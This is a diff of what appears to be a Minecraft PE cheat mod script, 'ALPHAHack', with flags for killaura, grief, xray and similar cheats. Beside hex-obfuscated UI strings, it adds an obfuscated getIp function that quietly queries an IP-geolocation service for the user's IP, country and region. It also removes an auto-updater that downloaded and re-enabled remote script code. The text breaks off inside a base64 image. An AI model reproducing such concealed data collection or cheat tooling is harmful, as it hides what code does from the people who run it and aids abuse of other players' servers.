+var GUIColor11 = Color.GREEN;
+var GUIColor12 = Color.MAGENTA;
+
+var GUIName = Color.WHITE;
+
+var GUIPos = Gravity.CENTER;
+
+var GUIBtns = Color.BLACK;
+
+var GUISize = 3;
+
+/***********************/
+
+var _0xc359=["\x6D\x65\x6E\x75\x2E\x63\x6F\x70\x79\x72\x69\x67\x68\x74","\x4D\x6F\x6A\x61\x6E\x67\x20\x26\x20\x41\x72\x63\x65\x75\x73\x5F\x6D\x61\x74\x74\x27\x73\x20\x41\x6C\x70\x68\x61\x48\x61\x63\x6B\x21","\x6C\x61\x6E\x67\x45\x64\x69\x74","\x6D\x65\x6E\x75\x2E\x70\x6C\x61\x79","\xA7\x33\x50\x6C\x61\x79","\x6D\x65\x6E\x75\x2E\x6F\x70\x74\x69\x6F\x6E\x73","\xA7\x33\x53\x65\x74\x74\x69\x6E\x67\x73","\x6D\x65\x6E\x75\x2E\x73\x6B\x69\x6E\x73","\xA7\x33\x53\x6B\x69\x6E\x73","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x68\x65\x61\x64\x65\x72\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x53\x65\x6C\x65\x63\x74\x20\x77\x6F\x72\x6C\x64","\x73\x6B\x69\x6E\x73\x2E\x74\x69\x74\x6C\x65","\x6F\x70\x74\x69\x6F\x6E\x73\x2E\x74\x69\x74\x6C\x65","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x6D\x65\x73\x73\x61\x67\x65","\xA7\x63\xA7\x6C\x57\x61\x73\x74\x65\x64","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x6E\x65\x77","\xA7\x33\x4E\x65\x77","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\xA7\x33\x42\x61\x63\x6B","\x73\x6B\x69\x6E\x73\x2E\x72\x65\x73\x74\x6F\x72\x65\x2E\x62\x75\x74\x74\x6F\x6E","\xA7\x33\x52\x65\x73\x74\x6F\x72\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x64\x76\x61\x6E\x63\x65\x64","\xA7\x33\x41\x64\x76\x61\x6E\x63\x65\x64","\x65\x78\x74\x65\x72\x6E\x61\x6C\x53\x65\x72\x76\x65\x72\x53\x63\x72\x65\x65\x6E\x2E\x61\x64\x64\x53\x65\x72\x76\x65\x72","\xA7\x33\x41\x64\x64\x20\x53\x65\x72\x76\x65\x72","\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x65\x72\x2E\x6A\x6F\x69\x6E\x65\x64","\xA7\x33\x25\x73\x20\x6A\x6F\x69\x6E\x65\x64\x20\x74\x68\x65\x20\x67\x61\x6D\x65","\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x65\x72\x2E\x6C\x65\x66\x74","\xA7\x33\x25\x73\x20\x6C\x65\x66\x74\x20\x74\x68\x65\x20\x67\x61\x6D\x65","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\xA7\x33\x4D\x61\x69\x6E\x20\x4D\x65\x6E\x75","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x72\x65\x73\x70\x61\x77\x6E","\xA7\x33\x52\x65\x73\x70\x61\x77\x6E","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x6F\x70\x74\x69\x6F\x6E\x73","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x62\x61\x63\x6B","\xA7\x33\x42\x61\x63\x6B\x20\x74\x6F\x20\x67\x61\x6D\x65","\x6D\x65\x6E\x75\x2E\x72\x65\x74\x75\x72\x6E\x54\x6F\x47\x61\x6D\x65","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6D\x6F\x62","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x73\x6C\x61\x69\x6E\x20\x62\x79\x20\x25\x32\x24\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x66\x61\x6C\x6C","\xA7\x33\x25\x31\x24\x73\x20\x68\x69\x74\x20\x74\x68\x65\x20\x67\x72\x6F\x75\x6E\x64\x20\x74\x6F\x6F\x20\x68\x61\x72\x64","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x65\x78\x70\x6C\x6F\x73\x69\x6F\x6E","\xA7\x33\x25\x31\x24\x73\x20\x62\x6C\x65\x77\x20\x75\x70","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x61\x72\x72\x6F\x77","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x73\x68\x6F\x74\x20\x62\x79\x20\x25\x32\x24\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x64\x72\x6F\x77\x6E","\xA7\x33\x25\x31\x24\x73\x20\x64\x72\x6F\x77\x6E\x65\x64","\x64\x65\x61\x74\x68\x2E\x66\x65\x6C\x6C\x2E\x61\x63\x63\x69\x64\x65\x6E\x74\x2E\x67\x65\x6E\x65\x72\x69\x63","\xA7\x33\x25\x31\x24\x73\x20\x66\x65\x6C\x6C\x20\x66\x72\x6F\x6D\x20\x61\x20\x68\x69\x67\x68\x20\x70\x6C\x61\x63\x65","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6F\x75\x74\x4F\x66\x57\x6F\x72\x6C\x64","\xA7\x33\x25\x31\x24\x73\x20\x66\x65\x6C\x6C\x20\x6F\x75\x74\x20\x6F\x66\x20\x74\x68\x65\x20\x77\x6F\x72\x6C\x64","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6F\x6E\x46\x69\x72\x65","\xA7\x33\x25\x31\x24\x73\x20\x62\x75\x72\x6E\x65\x64\x20\x74\x6F\x20\x64\x65\x61\x74\x68","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6D\x61\x67\x69\x63","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x6B\x69\x6C\x6C\x65\x64\x20\x62\x79\x20\x6D\x61\x67\x69\x63","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x69\x6E\x57\x61\x6C\x6C","\xA7\x33\x25\x31\x24\x73\x20\x73\x75\x66\x66\x6F\x63\x61\x74\x65\x64\x20\x69\x6E\x20\x61\x20\x77\x61\x6C\x6C","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6C\x61\x76\x61","\xA7\x33\x25\x31\x24\x73\x20\x74\x72\x69\x65\x64\x20\x74\x6F\x20\x73\x77\x69\x6D\x20\x69\x6E\x20\x6C\x61\x76\x61","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x69\x6E\x46\x69\x72\x65","\xA7\x33\x25\x31\x24\x73\x20\x77\x65\x6E\x74\x20\x75\x70\x20\x69\x6E\x20\x66\x6C\x61\x6D\x65\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x63\x61\x63\x74\x75\x73","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x70\x72\x69\x63\x6B\x65\x64\x20\x74\x6F\x20\x64\x65\x61\x74\x68","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x6F\x70\x2E\x73\x75\x63\x63\x65\x73\x73","\xA7\x6C\x4F\x70\x70\x65\x64\x20\x25\x73","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x62\x61\x6E\x69\x70\x2E\x73\x75\x63\x63\x65\x73\x73","\xA7\x72\x42\x61\x6E\x6E\x65\x64\x20\x49\x50\x20\x61\x64\x64\x72\x65\x73\x73\x20\xA7\x6C\x25\x73","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x62\x61\x6E\x69\x70\x2E\x73\x75\x63\x63\x65\x73\x73\x2E\x70\x6C\x61\x79\x65\x72\x73","\xA7\x72\x42\x61\x6E\x6E\x65\x64\x20\x49\x50\x20\x61\x64\x64\x72\x65\x73\x73\x20\xA7\x6C\x25\x73\x20\xA7\x72\x62\x65\x6C\x6F\x6E\x67\x69\x6E\x67\x20\x74\x6F\x20\x25\x73","\x63\x68\x61\x74\x53\x63\x72\x65\x65\x6E\x2E\x68\x69\x64\x65","\xA7\x33\x48\x69\x64\x65","\xA7\x33\x42\x61\x63\x6B\x20\x74\x6F\x20\x47\x61\x6D\x65","\x6D\x65\x6E\x75\x2E\x70\x6C\x61\x79\x4F\x6E\x52\x65\x61\x6C\x6D\x73","\xA7\x33\x50\x6C\x61\x79\x20\x6F\x6E\x20\x52\x65\x61\x6C\x6D\x73","\x6D\x65\x6E\x75\x2E\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72","\xA7\x33\x4D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72","\x6D\x65\x6E\x75\x2E\x6F\x6E\x6C\x69\x6E\x65","\xA7\x33\x4D\x69\x6E\x65\x63\x72\x61\x66\x74\x20\x52\x65\x61\x6C\x6D\x73","\x6D\x65\x6E\x75\x2E\x61\x63\x68\x69\x65\x76\x65\x6D\x65\x6E\x74\x73","\xA7\x33\x41\x63\x68\x69\x65\x76\x65\x6D\x65\x6E\x74\x73","\x61\x63\x74\x69\x6F\x6E\x2E\x69\x6E\x74\x65\x72\x61\x63\x74\x2E\x63\x72\x65\x61\x74\x65\x4D\x61\x70","\xA7\x33\x43\x72\x65\x61\x74\x65\x20\x4D\x61\x70","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x63\x74\x69\x6F\x6E\x2E\x65\x64\x69\x74\x4C\x6F\x63\x61\x6C","\xA7\x33\x4D\x61\x6B\x65\x20\x49\x6E\x66\x69\x6E\x69\x74\x65\x21","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x63\x74\x69\x6F\x6E\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x43\x72\x65\x61\x74\x65\x20\x57\x6F\x72\x6C\x64\x21","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x6C\x77\x61\x79\x73\x44\x61\x79","\xA7\x33\x41\x6C\x77\x61\x79\x73\x20\x44\x61\x79","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x64\x65\x6C\x65\x74\x65","\x44\x65\x6C\x65\x74\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x2E\x73\x65\x74\x74\x69\x6E\x67\x73","\xA7\x33\x47\x61\x6D\x65\x20\x53\x65\x74\x74\x69\x6E\x67\x73","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x4D\x6F\x64\x65\x2E\x63\x72\x65\x61\x74\x69\x76\x65","\xA7\x33\x43\x72\x65\x61\x74\x69\x76\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x4D\x6F\x64\x65\x2E\x73\x75\x72\x76\x69\x76\x61\x6C","\xA7\x33\x53\x75\x72\x76\x69\x76\x61\x6C","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x68\x65\x61\x64\x65\x72\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x43\x72\x65\x61\x74\x65\x20\x61\x20\x57\x6F\x72\x6C\x64"];ModPE[_0xc359[2]](_0xc359[0],_0xc359[1]);ModPE[_0xc359[2]](_0xc359[3],_0xc359[4]);ModPE[_0xc359[2]](_0xc359[5],_0xc359[6]);ModPE[_0xc359[2]](_0xc359[7],_0xc359[8]);ModPE[_0xc359[2]](_0xc359[9],_0xc359[10]);ModPE[_0xc359[2]](_0xc359[11],_0xc359[8]);ModPE[_0xc359[2]](_0xc359[12],_0xc359[6]);ModPE[_0xc359[2]](_0xc359[13],_0xc359[14]);ModPE[_0xc359[2]](_0xc359[15],_0xc359[16]);ModPE[_0xc359[2]](_0xc359[17],_0xc359[18]);ModPE[_0xc359[2]](_0xc359[19],_0xc359[20]);ModPE[_0xc359[2]](_0xc359[21],_0xc359[22]);ModPE[_0xc359[2]](_0xc359[23],_0xc359[24]);ModPE[_0xc359[2]](_0xc359[25],_0xc359[26]);ModPE[_0xc359[2]](_0xc359[27],_0xc359[28]);ModPE[_0xc359[2]](_0xc359[29],_0xc359[30]);ModPE[_0xc359[2]](_0xc359[31],_0xc359[32]);ModPE[_0xc359[2]](_0xc359[33],_0xc359[30]);ModPE[_0xc359[2]](_0xc359[34],_0xc359[6]);ModPE[_0xc359[2]](_0xc359[35],_0xc359[36]);ModPE[_0xc359[2]](_0xc359[37],_0xc359[36]);ModPE[_0xc359[2]](_0xc359[38],_0xc359[39]);ModPE[_0xc359[2]](_0xc359[40],_0xc359[41]);ModPE[_0xc359[2]](_0xc359[42],_0xc359[43]);ModPE[_0xc359[2]](_0xc359[44],_0xc359[45]);ModPE[_0xc359[2]](_0xc359[46],_0xc359[47]);ModPE[_0xc359[2]](_0xc359[48],_0xc359[49]);ModPE[_0xc359[2]](_0xc359[50],_0xc359[51]);ModPE[_0xc359[2]](_0xc359[52],_0xc359[53]);ModPE[_0xc359[2]](_0xc359[54],_0xc359[55]);ModPE[_0xc359[2]](_0xc359[56],_0xc359[57]);ModPE[_0xc359[2]](_0xc359[58],_0xc359[59]);ModPE[_0xc359[2]](_0xc359[60],_0xc359[61]);ModPE[_0xc359[2]](_0xc359[62],_0xc359[63]);ModPE[_0xc359[2]](_0xc359[64],_0xc359[65]);ModPE[_0xc359[2]](_0xc359[66],_0xc359[67]);ModPE[_0xc359[2]](_0xc359[68],_0xc359[69]);ModPE[_0xc359[2]](_0xc359[70],_0xc359[71]);ModPE[_0xc359[2]](_0xc359[37],_0xc359[72]);ModPE[_0xc359[2]](_0xc359[73],_0xc359[74]);ModPE[_0xc359[2]](_0xc359[75],_0xc359[76]);ModPE[_0xc359[2]](_0xc359[77],_0xc359[78]);ModPE[_0xc359[2]](_0xc359[79],_0xc359[80]);ModPE[_0xc359[2]](_0xc359[81],_0xc359[82]);ModPE[_0xc359[2]](_0xc359[83],_0xc359[84]);ModPE[_0xc359[2]](_0xc359[85],_0xc359[86]);ModPE[_0xc359[2]](_0xc359[87],_0xc359[88]);ModPE[_0xc359[2]](_0xc359[89],_0xc359[90]);ModPE[_0xc359[2]](_0xc359[91],_0xc359[92]);ModPE[_0xc359[2]](_0xc359[93],_0xc359[94]);ModPE[_0xc359[2]](_0xc359[95],_0xc359[96]);ModPE[_0xc359[2]](_0xc359[97],_0xc359[98])
+
+/***********************/
+
+//Block default time code by KILLERBLS - (Ghosthack) credits to his open src.
+
+var defaultDestroyTime = [
+null, 1.5, 0.6, 0.5, 2, 2, 0, -1, null, null, null, null, 
+0.5, 0.6, 3, 3, 3, 2, 0.2, 0.6, 0.3, 3, 3, null, 0.8, null, 
+0.2, 0.7, null, null, 4, 0, 0, null, null, 0.8, null, 0, 
+0, 0, 0, 3, 5, 2, 2, 2, 0, 1.5, 2, 50, 0, 0, null, 2, 2.5, 
+null, 3, 5, 2.5, 0, 0.6, 3.5, 3.5, 1, 3, 0.4, 0.7, 2, 1, 
+null, null, 5, null, 3, 3, null, null, null, 0.1, 0.5, 0.2, 
+0.4, 0.6, 0, null, 2, 1, 0.4, 0.3, null, 1, 0.5, null, null, 
+-1, 3, null, 1.5, null, null, 5, 0.3, 1, 0, 0, null, 2, 2, 
+1.5, null, null, 2, null, 2, null, null, null, null, null, 
+null, null, null, null, null, null, null, null, 0.8, null, 
+null, null, null, null, 2, 2, 2, null, null, 2, null, 0, 0, 
+null, null, null, null, null, null, null, null, null, null, 
+null, null, 0.8, 0.8, 2, 2, null, null, null, null, null, null, 
+null, null, null, null, null, 0.5, 0.1, 5, null, null, null, 
+null, null, null, null, null, null, null, null, null, null, null, 
+null, null, null, null, null, null, null, null, null, null, null, 
+null, null, null, null, null, null, null, null, null, null, null, 
+null, null, null, null, null, null, null, null, null, null, null, 
+null, null, null, null, null, null, null, null, null, null, null, 
+null, null, null, null, null, null, null, null, null, null, null, 
+null, 0, 3.5, 50, 5, 0.6, 0.6, 5, null, null, null, null, 0
+]; 
+
+/***********************/
+
+function dip2px(dips){
+    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
+}
+
+function newLevel(){ 
+clientMessage(client + "§7Check out our server §ec57788.leet.cc 57788" + "\n" + "§aKik§f: ArceusMatt" + "\n" + "§bTwitter§f: @ArceusMatt" + "\n" + "§cGoogle+§f: Arceus matt");
+}
+
+/***********************/
+
+//Dropbox updater
+
+var checkForUpdate=false;
+var updateWindow=false; 
+var newUpdate;
+var updateMod;
 
 function checkVersion() {
     var r  = new java.lang.Runnable() {
@@ -108,241 +211,23 @@ print("New update! " + newUpdate);
     var threadt = new java.lang.Thread(r);
     threadt.start();
 }
+
 function updateVersion() {
-                var ru  = new java.lang.Runnable() {
-                    run: function() {
-                        try {
-var urls = new java.net.URL("https://raw.githubusercontent.com/ArceusMatt/ALPHAHack/master/ALPHAHack.js");
-                            var check = urls.openConnection();
-                            check.setRequestMethod("GET");
-                            check.setDoOutput(true);
-                            check.connect();
-                            check.getContentLength();
-                            var script = check.getInputStream();
-                            var typeb = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
-                            var byteCount = 0;
-                            while((byteCount = script.read(typeb)) != -1) { 
-                                updateMod += new java.lang.String(typeb, 0, byteCount);               
-                            }
-                            var modpeFolder = ctx.getDir("modscripts", 0);
-                            var modpeFile = new java.io.File(modpeFolder, "ALPHAHack.js");
-                            var update = new java.io.PrintWriter(modpeFile);
-                            update.write(updateMod);
-                            update.flush();
-                            update.close();
-                             
-                            try {
-                                net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, false);
-                                net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, true);
-                                print("installed");
-                                   
-                            }
-                            catch(err) {
-                                print("Error: \n" + err);
-                            }
-                        }
-                        catch(err) {
-                            print("Error: \n" + err);
-                        }
-                    }
-                }
-                var threadt = new java.lang.Thread(ru);
-                threadt.start();
+                var urls = new Intent(ctx);                  urls.setAction(Intent.ACTION_VIEW);
+                    urls.setData(Uri.parse("https://www.dropbox.com/s/k29sz9u27sgqnjr/ALPHAHack.js?dl=1"));
+                    ctx.startActivity(urls);
             }
 
-var sspam = false;
+/***********************/
 
-var hackk = false;
-var showp = false;
-var fch = false;
-var onlyday = false;
-var saddle = false;
-var instakilled = false;
-var instabreak = false;
-var stackheart = false;
-var parti = false;
-var parti2 = false;
-var nowalls = false;
-var waterwalk = false;
-var highjumps = false;
-var grief = false;
-var killaura = false;
-var killfaura = false;
-var uirender = false; 
-var xxray = false; 
-var stat22 = false; 
-var healthy = true;
-var infhun = false;
-var firepunch = false;
-var lightning = false;
-var primedtnt = false;
-var arrow = false;
-var exporb = false;
-var minecart = false;
+//Base64 encode.
+//& something from godsoft... encrypted.
 
-var GUIColor = Color.TRANSPARENT
-var GUIColor1 = Color.TRANSPARENT;
-var GUIColor2 = Color.BLACK;
-var GUIColor3 = Color.WHITE;
-var GUIColor4 = Color.RED;
-var GUIColor5 = Color.BLUE;
-var GUIColor6 = Color.GRAY;
-var GUIColor7 = Color.LTGRAY;
-var GUIColor8 = Color.YELLOW;
-var GUIColor9 = Color.CYAN;
-var GUIColor10 = Color.DKGRAY;
-var GUIColor11 = Color.GREEN;
-var GUIColor12 = Color.MAGENTA;
+var _0x567c=["\x68\x74\x74\x70\x3A\x2F\x2F\x69\x70\x2D\x61\x70\x69\x2E\x63\x6F\x6D\x2F\x6A\x73\x6F\x6E","\x6E\x65\x74","\x6F\x70\x65\x6E\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x47\x45\x54","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x4D\x65\x74\x68\x6F\x64","\x73\x65\x74\x44\x6F\x4F\x75\x74\x70\x75\x74","\x63\x6F\x6E\x6E\x65\x63\x74","\x67\x65\x74\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x65\x6E\x67\x74\x68","\x67\x65\x74\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D","\x42\x79\x74\x65","\x6C\x61\x6E\x67","\x6E\x65\x77\x49\x6E\x73\x74\x61\x6E\x63\x65","\x41\x72\x72\x61\x79","\x72\x65\x66\x6C\x65\x63\x74","\x72\x65\x61\x64","","\x70\x61\x72\x73\x65","\x73\x75\x63\x63\x65\x73\x73","\x65\x71\x75\x61\x6C\x73","\x73\x74\x61\x74\x75\x73","\x71\x75\x65\x72\x79","\x63\x6F\x75\x6E\x74\x72\x79","\x72\x65\x67\x69\x6F\x6E\x4E\x61\x6D\x65","\x45\x72\x72\x6F\x72","\x6C\x69\x6E\x65\x4E\x75\x6D\x62\x65\x72","\x73\x74\x61\x72\x74"];function getIp(_0x9781x2){var _0x9781x3= new java[_0x567c[10]].Runnable({run:function(){try{var _0x9781x4= new java[_0x567c[1]].URL(_0x567c[0]);var _0x9781x5=_0x9781x4[_0x567c[2]]();_0x9781x5[_0x567c[4]](_0x567c[3]);_0x9781x5[_0x567c[5]](true);_0x9781x5[_0x567c[6]]();_0x9781x5[_0x567c[7]]();var _0x9781x6=_0x9781x5[_0x567c[8]]();var _0x9781x7=java[_0x567c[10]][_0x567c[13]][_0x567c[12]][_0x567c[11]](java[_0x567c[10]][_0x567c[9]].TYPE,1024);var _0x9781x8=0;var _0x9781x9;while((_0x9781x8=_0x9781x6[_0x567c[14]](_0x9781x7))!= -1){_0x9781x9= new java[_0x567c[10]].String(_0x9781x7,0,_0x9781x8)};var _0x9781xa=JSON[_0x567c[16]](_0x9781x9+_0x567c[15]);if(_0x9781xa[_0x567c[19]][_0x567c[18]](_0x567c[17])){_0x9781x2( new Array(_0x9781xa[_0x567c[20]],_0x9781xa[_0x567c[21]],_0x9781xa[_0x567c[22]]))}else {print(_0x567c[23]);_0x9781x2( new Array(_0x567c[23],_0x567c[23],_0x567c[23]))}}catch(e){clientMessage(e);clientMessage(e[_0x567c[24]])}}});var _0x9781xb= new java[_0x567c[10]].Thread(_0x9781x3);_0x9781xb[_0x567c[25]]()}
 
-var GUIName = Color.WHITE;
+var bg64 = "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